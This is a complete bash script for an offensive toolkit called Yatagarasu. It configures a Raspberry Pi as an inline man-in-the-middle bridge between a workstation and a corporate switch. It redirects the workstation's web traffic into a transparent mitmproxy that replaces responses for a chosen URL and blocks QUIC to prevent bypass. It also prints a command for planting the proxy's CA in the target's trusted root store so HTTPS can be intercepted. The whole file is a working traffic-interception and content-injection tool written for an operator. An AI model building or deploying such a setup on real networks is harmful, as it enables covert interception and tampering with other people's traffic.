#!/usr/bin/env bash
# =============================================================================
#  pi_intercept_setup  |  Yatagarasu — inline MITM ("intercept") mode
#  Author: d3vn0mi
#
#  THIRD wired role. The Pi sits inline between a WORKSTATION (e.g. Windows) and
#  the CORPORATE SWITCH as a Linux bridge, but — unlike the stealth bridge
#  (pi_bridge_setup.sh) — it is a VISIBLE, active L3 host: br0 takes a real
#  corporate IP, br_netfilter + ip_forward are ON, and selected web traffic from
#  the workstation is REDIRECTed into a local mitmproxy that can replace the
#  response for one exact URL. Ordinary bridged frames keep the workstation's own
#  source address; only the proxied connections originate from the Pi's IP.
#
#  Management stays AP-style and out-of-band, exactly as the operator wants:
#    * wlan0  — the AP from pi_ap_dropbox_setup.sh keeps running (mgmt + updrop).
#    * a dedicated management CABLE (MGMT_IFACE) for the ops laptop, NOT bridged.
#  Neither bridge member is used for management.
#
#  !! THIS IS NOT STEALTHY. The Pi answers ARP on the corporate net, makes its
#     own outbound connections, and HTTPS interception requires installing the
#     proxy CA on the target. Use pi_bridge_setup.sh when you need invisibility.
#
#  !! DANGER: inline on the workstation's only uplink. A Pi crash drops its link
#     (software bridge, no hardware fail-through). Bench-test before real use.
#
#  MODES:
#    up        build bridge + corp IP + intercept + proxy (+ AP/mgmt plane)
#    down      tear it all down and restore the AP baseline (no reboot)
#    status    bridge, members, redirect rules, proxy, mgmt NIC
#    ca        print where the mitmproxy CA cert is (to install on the target)
#    help
#
#  REQUIREMENTS:
#    * TWO wired NICs for the bridge (WS_IFACE + UP_IFACE) + optionally a third
#      for the mgmt cable. ebtables NOT needed; this mode is L3-aware on purpose.
#    * mitmproxy, iptables, iproute2, isc-dhcp-client (for br0 DHCP). Installed by 'up'.
#    * HTTP works as-is. HTTPS needs the CA trusted on the workstation (see 'ca').
#    * Assumes PASSIVE MAC monitoring, no 802.1X, and the browser talking directly
#      to :80/:443 (no PAC/explicit proxy/VPN, QUIC/HTTP3 blockable — see below).
#
#  Run:  sudo bash pi_intercept_setup.sh up   (over wlan0 / the mgmt cable / console,
#        NEVER over the bridged wire — bringing the bridge up flaps both members)
#
#  Changelog:
#    v0.2  mgmt DHCP pool derived from MGMT_IP/MGMT_PREFIX (was hardcoded 10.73.0.x
#          /24 -> wrong subnet if pi-mode.conf moves MGMT_IP); overrides validated.
#    v0.1  initial inline-intercept mode (bridge + br_netfilter + REDIRECT to a
#          mitmproxy addon that rewrites one exact URL; AP + mgmt-cable plane kept).
#          UNVALIDATED ON HARDWARE — bench-test the exact cabling first.
# =============================================================================
set -euo pipefail

# --- shared identity (optional single source of truth; overrides the CONFIG below) ---
_SHARED_CONF="${PI_MODE_CONF:-/etc/pi-mode/pi-mode.conf}"
[[ -r "$_SHARED_CONF" ]] && . "$_SHARED_CONF" || true

### ---- CONFIG ---------------------------------------------------------------
BR="br0"
WS_IFACE="${WIRED_IFACE:-eth0}"           # faces the WORKSTATION / target (bridged member)
UP_IFACE="${SECOND_IFACE:-usb0}"           # faces the CORPORATE SWITCH / uplink (bridged member)

# br0 needs a REAL corporate address (the proxy makes its own outbound calls).
BR_DHCP="1"               # 1 = br0 pulls a corporate lease via UP_IFACE (dhclient)
BR_IP=""                  # static fallback when BR_DHCP=0, e.g. 192.0.2.20
BR_PREFIX="24"
BR_GW=""                  # static mode default route, e.g. 192.0.2.1
BR_DNS="1.1.1.1"          # resolver for the Pi in static mode (space-separated)

# --- management plane (NOT bridged) — your ops laptop --------------------------
KEEP_AP="1"               # leave wlan0 hostapd/dnsmasq (AP) up as mgmt + drop plane
ENABLE_MGMT="1"           # dedicated management CABLE on its own NIC (ethernet to laptop)
MGMT_IFACE="${MGMT_IFACE:-eth2}"         # the mgmt NIC — MUST differ from WS_IFACE/UP_IFACE, not bridged
MGMT_IP="${MGMT_IP:-10.73.0.1}"       # pick a subnet that will NOT overlap the corporate net
MGMT_PREFIX="${MGMT_PREFIX:-24}"
MGMT_DHCP="1"             # hand the ops laptop an address via a dedicated dnsmasq
MGMT_DHCP_START=""        # empty = derived from MGMT_IP/MGMT_PREFIX (set both to override)
MGMT_DHCP_END=""

# --- intercept / proxy --------------------------------------------------------
PROXY_PORT="8080"
UPLOAD_PORT="${UPLOAD_PORT:-80}"         # updrop port, fenced off the corporate br0 IP
PROXY_USER="mitm"         # unprivileged user mitmdump runs as (created if missing)
WORKDIR="/opt/inline-proxy"   # addon, replacement HTML, mitmproxy home (CA) live here
INTERCEPT_HTTP="1"        # redirect workstation TCP/80 into the proxy
INTERCEPT_HTTPS="0"       # redirect TCP/443 too — REQUIRES the CA on the target (non-silent)
TARGET_HOST="portal.example.com"   # the one hostname to rewrite
TARGET_PATH="/special-page"        # the one path to rewrite (exact; query string excluded)
ALLOW_HOSTS="^portal\\.example\\.com(:443)?$"   # HTTPS: limit TLS interception to this (SNI)
BLOCK_QUIC="1"            # drop workstation UDP/443 so HTTP/3 can't bypass the TCP redirect
### --------------------------------------------------------------------------

need_root(){ [[ $EUID -eq 0 ]] || { echo "run as root (sudo)" >&2; exit 1; }; }
have(){ command -v "$1" >/dev/null 2>&1; }
mac_of(){ cat "/sys/class/net/$1/address" 2>/dev/null; }

ensure_tools(){
  local pkgs=()
  have mitmdump || pkgs+=(mitmproxy)
  have iptables || pkgs+=(iptables)
  have dhclient || pkgs+=(isc-dhcp-client)
  if (( ${#pkgs[@]} )); then
    echo "[*] installing: ${pkgs[*]}"; apt-get update -y && apt-get install -y "${pkgs[@]}"
  fi
}

ensure_user(){
  id "$PROXY_USER" >/dev/null 2>&1 || { echo "[*] creating service user $PROXY_USER"; \
    useradd --system --home-dir "$WORKDIR" --shell /usr/sbin/nologin "$PROXY_USER"; }
  install -d -o "$PROXY_USER" -g "$PROXY_USER" "$WORKDIR" "$WORKDIR/.mitmproxy"
}

preflight_guard(){
  [[ "$WS_IFACE" != "$UP_IFACE" ]] || { echo "!! WS_IFACE and UP_IFACE must differ" >&2; exit 2; }
  [[ -e "/sys/class/net/$WS_IFACE" ]] || { echo "!! $WS_IFACE not present" >&2; exit 2; }
  [[ -e "/sys/class/net/$UP_IFACE" ]] || { echo "!! $UP_IFACE not present (USB NIC plugged in?)" >&2; exit 2; }
  if [[ "$ENABLE_MGMT" == "1" ]]; then
    [[ "$MGMT_IFACE" != "$WS_IFACE" && "$MGMT_IFACE" != "$UP_IFACE" ]] || {
      echo "!! MGMT_IFACE ($MGMT_IFACE) must differ from the bridge members — it is NOT bridged" >&2; exit 2; }
    [[ -e "/sys/class/net/$MGMT_IFACE" ]] || {
      echo "!! MGMT_IFACE ($MGMT_IFACE) not present. Plug it in, fix MGMT_IFACE, or set ENABLE_MGMT=0" >&2; exit 2; }
  fi
  if [[ "$BR_DHCP" != "1" ]]; then
    [[ -n "$BR_IP" && -n "$BR_GW" ]] || { echo "!! static br0 needs BR_IP and BR_GW (or set BR_DHCP=1)" >&2; exit 2; }
  fi
}

unmanage_nm(){   # keep NM/dhcpcd off the two bridge members (br0 is handled by us)
  install -d /etc/NetworkManager/conf.d
  cat >/etc/NetworkManager/conf.d/99-intercept-unmanaged.conf <<EOF
[keyfile]
unmanaged-devices=interface-name:${WS_IFACE};interface-name:${UP_IFACE};interface-name:${BR}$( [[ "$ENABLE_MGMT" == "1" ]] && echo ";interface-name:${MGMT_IFACE}" )
EOF
  systemctl reload NetworkManager 2>/dev/null || true
  if have nmcli; then
    nmcli device set "$WS_IFACE" managed no 2>/dev/null || true
    nmcli device set "$UP_IFACE" managed no 2>/dev/null || true
  fi
}

strip_member_l3(){ local i; for i in "$WS_IFACE" "$UP_IFACE"; do
    ip route flush dev "$i" 2>/dev/null || true; ip addr flush dev "$i" 2>/dev/null || true; done; }

stop_eth_ap_on_member(){   # eth0 may carry the AP-mode wired IP; it's a bridge member now
  for u in eth-ip; do
    systemctl is-active --quiet "$u" 2>/dev/null && { echo "    stopping '$u' (its NIC is now a bridge member)"; systemctl stop "$u" 2>/dev/null || true; }
  done
}

write_addon(){
  install -d "$WORKDIR"
  cat >"$WORKDIR/replacement.html" <<'HTML'
<!doctype html>
<html lang="en"><meta charset="utf-8">
<title>Replaced</title>
<h1>Custom content served inline by Yatagarasu (karasu)</h1>
<p>This page was substituted at the wire for the configured target URL.</p>
</html>
HTML
  # addon: match host+path for the configured target, http and https alike.
  cat >"$WORKDIR/replace.py" <<PY
from pathlib import Path
from mitmproxy import http

CONTENT = Path(__file__).with_name("replacement.html").read_bytes()
TARGET_HOST = "${TARGET_HOST}".lower()
TARGET_PATH = "${TARGET_PATH}"

def request(flow: http.HTTPFlow) -> None:
    r = flow.request
    if (
        r.method == "GET"
        and r.scheme in ("http", "https")
        and r.host.lower() == TARGET_HOST
        and r.port in (80, 443)
        and r.path == TARGET_PATH
    ):
        flow.response = http.Response.make(
            200, CONTENT,
            {"Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store"},
        )
PY
  chown -R "$PROXY_USER":"$PROXY_USER" "$WORKDIR" 2>/dev/null || true
  echo "    addon + replacement.html written to $WORKDIR (edit replacement.html for real content)"
}

# ---- firewall: specific rules only, added/removed symmetrically (never flush) ----
fw_specs(){   # emit "table|rule" lines for the current config
  [[ "$INTERCEPT_HTTP" == "1" ]] && echo "nat|PREROUTING -m physdev --physdev-in ${WS_IFACE} -p tcp --dport 80 -j REDIRECT --to-ports ${PROXY_PORT}"
  [[ "$INTERCEPT_HTTPS" == "1" ]] && echo "nat|PREROUTING -m physdev --physdev-in ${WS_IFACE} -p tcp --dport 443 -j REDIRECT --to-ports ${PROXY_PORT}"
  echo "filter|INPUT -i ${BR} -p tcp --dport ${PROXY_PORT} -j ACCEPT"
  echo "filter|INPUT -i ${BR} -p tcp --dport ${UPLOAD_PORT} -j DROP"   # fence no-auth updrop off the corp side
  echo "filter|FORWARD -i ${BR} -o ${BR} -j ACCEPT"
  [[ "$BLOCK_QUIC" == "1" ]] && echo "filter|FORWARD -m physdev --physdev-in ${WS_IFACE} -p udp --dport 443 -j DROP"
}
fw_apply(){ local line t r; while IFS='|' read -r t r; do [[ -z "$t" ]] && continue
    iptables -t "$t" -C $r 2>/dev/null || iptables -t "$t" -A $r; done < <(fw_specs); }
fw_clear(){ local line t r; while IFS='|' read -r t r; do [[ -z "$t" ]] && continue
    iptables -t "$t" -D $r 2>/dev/null || true; done < <(fw_specs); }

start_proxy(){
  ensure_user; write_addon
  local https_opt=""
  [[ "$INTERCEPT_HTTPS" == "1" ]] && https_opt="--allow-hosts ${ALLOW_HOSTS}"
  pkill -u "$PROXY_USER" -f "mitmdump" 2>/dev/null || true
  echo "[*] starting mitmdump (transparent) on :${PROXY_PORT} as ${PROXY_USER}..."
  sudo -u "$PROXY_USER" HOME="$WORKDIR" nohup \
    mitmdump --mode transparent --listen-host 0.0.0.0 --listen-port "$PROXY_PORT" \
             --set connection_strategy=lazy $https_opt -s "$WORKDIR/replace.py" \
    >"$WORKDIR/mitmdump.log" 2>&1 &
  sleep 1
  pgrep -u "$PROXY_USER" -f mitmdump >/dev/null && echo "    mitmdump up (log: $WORKDIR/mitmdump.log)" \
    || echo "    !! mitmdump did not start — check $WORKDIR/mitmdump.log"
}

br0_address(){
  ip addr flush dev "$BR" 2>/dev/null || true
  if [[ "$BR_DHCP" == "1" ]]; then
    echo "[*] br0: requesting a corporate DHCP lease..."
    dhclient -1 -v "$BR" 2>/dev/null || dhclient "$BR" 2>/dev/null || \
      echo "    !! dhclient failed — set BR_DHCP=0 with static BR_IP/BR_GW"
  else
    echo "[*] br0: static ${BR_IP}/${BR_PREFIX} via ${BR_GW}"
    ip addr add "${BR_IP}/${BR_PREFIX}" dev "$BR"
    ip route replace default via "$BR_GW" dev "$BR"
    : >/etc/resolv.conf; for d in $BR_DNS; do echo "nameserver $d" >>/etc/resolv.conf; done
  fi
}

ip2int(){ local IFS=. a b c d; read -r a b c d <<<"$1"; echo $(( (a<<24) | (b<<16) | (c<<8) | d )); }
int2ip(){ local n=$1; echo "$(( (n>>24)&255 )).$(( (n>>16)&255 )).$(( (n>>8)&255 )).$(( n&255 ))"; }
mgmt_dhcp_range(){   # -> "start end netmask" for the mgmt DHCP pool, derived from MGMT_IP/MGMT_PREFIX
  local p="$MGMT_PREFIX" ip mask net bc s e
  (( p >= 8 && p <= 29 )) || { echo "!! MGMT_PREFIX /$p unsupported for mgmt DHCP (use /8-/29)" >&2; return 1; }
  ip=$(ip2int "$MGMT_IP"); mask=$(( (0xFFFFFFFF << (32 - p)) & 0xFFFFFFFF ))
  net=$(( ip & mask )); bc=$(( net | (~mask & 0xFFFFFFFF) ))
  if [[ -n "${MGMT_DHCP_START:-}" && -n "${MGMT_DHCP_END:-}" ]]; then   # explicit override: validate it
    s=$(ip2int "$MGMT_DHCP_START"); e=$(ip2int "$MGMT_DHCP_END")
    (( (s & mask) == net && (e & mask) == net && s <= e )) || {
      echo "!! MGMT_DHCP_START/END (${MGMT_DHCP_START}-${MGMT_DHCP_END}) is not inside ${MGMT_IP}/${p}" >&2; return 1; }
  elif (( bc - net >= 160 )); then s=$(( net + 50 )); e=$(( net + 150 ))
  else s=$(( net + 2 )); e=$(( bc - 1 )); fi
  if (( ip >= s && ip <= e )); then                        # never lease the Pi's own address
    if (( ip - s >= e - ip )); then e=$(( ip - 1 )); else s=$(( ip + 1 )); fi
  fi
  (( s <= e )) || { echo "!! no room for a mgmt DHCP pool in ${MGMT_IP}/${p}" >&2; return 1; }
  echo "$(int2ip "$s") $(int2ip "$e") $(int2ip "$mask")"
}

mgmt_up(){
  [[ "$ENABLE_MGMT" == "1" ]] || return 0
  echo "[*] mgmt cable ${MGMT_IFACE} -> ${MGMT_IP}/${MGMT_PREFIX} (not bridged)"
  ip link set "$MGMT_IFACE" nomaster 2>/dev/null || true
  ip addr flush dev "$MGMT_IFACE" 2>/dev/null || true
  ip link set "$MGMT_IFACE" up
  ip addr add "${MGMT_IP}/${MGMT_PREFIX}" dev "$MGMT_IFACE"
  if [[ "$MGMT_DHCP" == "1" ]] && have dnsmasq; then
    local d_start d_end d_mask
    read -r d_start d_end d_mask <<<"$(mgmt_dhcp_range)" || return 1
    [[ -n "$d_start" ]] || return 1
    pkill -f "dnsmasq.*--conf-file=/etc/dnsmasq-mgmt.conf" 2>/dev/null || true
    cat >/etc/dnsmasq-mgmt.conf <<EOF
interface=${MGMT_IFACE}
bind-interfaces
no-resolv
dhcp-range=${d_start},${d_end},${d_mask},12h
dhcp-option=3
dhcp-option=6
EOF
    dnsmasq --conf-file=/etc/dnsmasq-mgmt.conf --pid-file=/run/dnsmasq-mgmt.pid
    echo "    mgmt DHCP on ${MGMT_IFACE}: ${d_start}-${d_end} /${MGMT_PREFIX} (no gw/dns)"
  fi
  echo "    reach the Pi at: ssh ...@${MGMT_IP}  /  http://${MGMT_IP}/"
}
mgmt_down(){ [[ "$ENABLE_MGMT" == "1" ]] || return 0
  pkill -f "dnsmasq.*--conf-file=/etc/dnsmasq-mgmt.conf" 2>/dev/null || true
  ip addr flush dev "$MGMT_IFACE" 2>/dev/null || true; }

intercept_up(){
  need_root; preflight_guard; ensure_tools
  unmanage_nm; stop_eth_ap_on_member; strip_member_l3
  # defensive: clear stealth-bridge residue (ebtables DROP / UPDROP_BRIN) from a prior
  # 'pi_bridge_setup.sh up' that was not 'down'ed — it would silently break intercept.
  if have ebtables; then ebtables -t filter -F 2>/dev/null || true; for c in INPUT OUTPUT FORWARD; do ebtables -t filter -P "$c" ACCEPT 2>/dev/null || true; done; fi
  iptables -D INPUT -i "$BR" -j UPDROP_BRIN 2>/dev/null || true
  iptables -F UPDROP_BRIN 2>/dev/null || true
  iptables -X UPDROP_BRIN 2>/dev/null || true

  echo "[*] building bridge ${BR} (${WS_IFACE}=workstation, ${UP_IFACE}=corp switch)..."
  ip link set "$WS_IFACE" down 2>/dev/null || true
  ip link set "$UP_IFACE" down 2>/dev/null || true
  ip link del "$BR" 2>/dev/null || true
  ip link add "$BR" type bridge
  ip link set "$BR" type bridge stp_state 0
  ip link set "$WS_IFACE" master "$BR"
  ip link set "$UP_IFACE" master "$BR"
  ip link set "$WS_IFACE" up
  ip link set "$UP_IFACE" up
  ip link set "$BR" up

  echo "[*] L3-aware bridging: br_netfilter + ip_forward on (opposite of stealth mode)"
  modprobe br_netfilter 2>/dev/null || true
  sysctl -qw net.bridge.bridge-nf-call-iptables=1 2>/dev/null || true
  sysctl -qw net.ipv4.ip_forward=1
  sysctl -qw net.ipv4.conf.all.send_redirects=0 2>/dev/null || true
  sysctl -qw "net.ipv4.conf.${BR}.send_redirects=0" 2>/dev/null || true

  br0_address
  mgmt_up
  start_proxy
  fw_apply

  echo
  echo "[OK] intercept up."
  echo "     workstation keeps its OWN corporate DHCP/IP; only matched web flows hit the proxy."
  echo "     rewriting: ${TARGET_HOST}${TARGET_PATH}  (http$( [[ "$INTERCEPT_HTTPS" == "1" ]] && echo "+https" ))"
  [[ "$INTERCEPT_HTTPS" == "1" ]] && echo "     HTTPS: install the CA on the target first  ->  sudo $0 ca"
  echo "     manage out-of-band: wlan0 AP$( [[ "$ENABLE_MGMT" == "1" ]] && echo " or ${MGMT_IP} on ${MGMT_IFACE}" ) — NEVER the bridged wire."
  echo "     tear down (restores AP baseline, no reboot):  sudo $0 down"
}

intercept_down(){
  need_root
  echo "!! tearing down ${BR} — if the Pi is inline, the workstation loses its link until re-cabled."
  fw_clear
  pkill -u "$PROXY_USER" -f mitmdump 2>/dev/null || true
  sysctl -qw net.bridge.bridge-nf-call-iptables=0 2>/dev/null || true
  sysctl -qw net.ipv4.ip_forward=0 2>/dev/null || true
  ip link set "$WS_IFACE" nomaster 2>/dev/null || true
  ip link set "$UP_IFACE" nomaster 2>/dev/null || true
  ip link del "$BR" 2>/dev/null || true
  mgmt_down
  rm -f /etc/NetworkManager/conf.d/99-intercept-unmanaged.conf
  systemctl reload NetworkManager 2>/dev/null || true
  have nmcli && { nmcli device set "$UP_IFACE" managed yes 2>/dev/null || true; }
  for u in eth-ip dnsmasq; do
    systemctl list-unit-files 2>/dev/null | grep -q "^${u}\." && { echo "    restoring AP-mode unit '$u'"; systemctl restart "$u" 2>/dev/null || true; }
  done
  echo "[OK] intercept removed; AP-mode baseline restored (no reboot needed)."
}

intercept_status(){
  echo "== bridge =="; ip -br link show "$BR" 2>/dev/null || echo "  $BR not present"
  echo "== members =="; bridge link show 2>/dev/null | grep -E "${WS_IFACE}|${UP_IFACE}" || true
  echo "== br0 address (corp side) =="; ip -br addr show "$BR" 2>/dev/null
  echo "== br_netfilter / ip_forward (want 1/1) =="
  printf '  nf-call-iptables=%s  ip_forward=%s\n' "$(cat /proc/sys/net/bridge/bridge-nf-call-iptables 2>/dev/null)" "$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null)"
  echo "== redirect rules (nat PREROUTING) =="; iptables -t nat -L PREROUTING -n -v 2>/dev/null | sed 's/^/  /'
  echo "== proxy =="; pgrep -u "$PROXY_USER" -af mitmdump 2>/dev/null | sed 's/^/  /' || echo "  mitmdump not running"
  echo "== target =="; echo "  ${TARGET_HOST}${TARGET_PATH}  http$( [[ "$INTERCEPT_HTTPS" == "1" ]] && echo "+https" )"
  echo "== mgmt NIC =="
  if [[ "$ENABLE_MGMT" == "1" ]]; then ip -br addr show "$MGMT_IFACE" 2>/dev/null | sed 's/^/  /'; else echo "  (ENABLE_MGMT=0)"; fi
}

show_ca(){
  local ca="$WORKDIR/.mitmproxy/mitmproxy-ca-cert.cer"
  if [[ -f "$ca" ]]; then
    echo "mitmproxy CA (install PUBLIC cert on the target's Trusted Root store):"
    echo "  $ca"
    echo "Windows (current user):  Import-Certificate -FilePath C:\\path\\mitmproxy-ca-cert.cer -CertStoreLocation Cert:\\CurrentUser\\Root"
    echo "NEVER distribute the private key (*-ca.pem)."
  else
    echo "CA not generated yet — run 'up' once (with the proxy started), then re-run 'ca'."
  fi
}

case "${1:-help}" in
  up)     intercept_up ;;
  down)   intercept_down ;;
  status) intercept_status ;;
  ca)     show_ca ;;
  help|-h|--help) sed -n '2,70p' "${BASH_SOURCE[0]}" | sed 's/^#\{1,\} \{0,1\}//' ;;
  *) echo "usage: $0 {up|down|status|ca|help}" >&2; exit 2 ;;
esac
